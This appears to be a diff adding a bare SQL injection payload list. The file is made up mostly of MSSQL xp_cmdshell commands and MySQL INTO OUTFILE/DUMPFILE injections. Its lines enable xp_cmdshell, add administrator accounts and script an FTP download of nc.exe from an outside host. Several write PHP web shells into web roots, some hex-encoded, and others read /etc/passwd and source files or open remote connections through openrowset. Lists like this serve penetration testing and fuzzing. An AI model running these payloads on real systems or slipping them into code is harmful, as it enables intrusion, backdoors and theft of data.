@@ -1,0 +1,54 @@
+, exec master..xp_cmdshell 'ping 172.10.1.255'--
+, exec master..xp_cmdshell
+, exec master..xp_cmdshell 'ping 10.10.1.2'--
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+1; EXEC master.dbo.sp_makewebtask '\\ip\share\payload.aspx', 'SELECT * FROM table', 0x0
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; EXECUTE master..xp_jro_Crypt "c:\\payload.vbs", "c:\\encrypted_payload.txt", "password"
+1;EXECUTE sp_add_job @job_name = 'TestJob';
+1; EXEC xp_cmdshell 'echo <?php system($_GET["cmd"]); ?> > C:\\xampp\\htdocs\\shell.php'
+1;print 'foo'; exec xp_cmdshell 'destroy';
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+5620 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+5986 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+6982 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+EXEC master.dbo.xp_cmdshell 'net localgroup administrators cwh /add' ;--
+EXEC master.dbo.xp_cmdshell 'net user cwh cwh1234 /add' ;--
+'; exec master..xp_cmdshell
+exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
+exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo USER >> ftpscript.txt';-- 
+exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+EXEC opendatasource('SQLoledb','Persist Security Info=False;DataSource=VICTIMDBNAME;UserID=CWH;Password=1234').master.dbo.xp_cmdshell 'net user hacklol 1234 /add';
+exec sp
+EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
+EXEC sp_add_job @job_name = 'TestJob';
+EXEC sp_configure 'show advanced options', 1;--
+EXEC sp_configure 'xp_cmdshell', 1;-- 
+; execute immediate 'sel' || 'ect us' || 'er'
+EXECUTE sp_add_job @job_name = 'TestJob';
+exec xp
+EXEC xp_cmdshell 'net user';
+'; exec xp_regread
+; exec xp_regread
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
+id=1; exec master.dbo.xp_cmdshell 'command'
+RECONFIGURE;-- 
+--sp_password
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+ union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+ UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
+ UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
+ UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+ UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+ union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5','select * from table')--
+ UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
+ UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
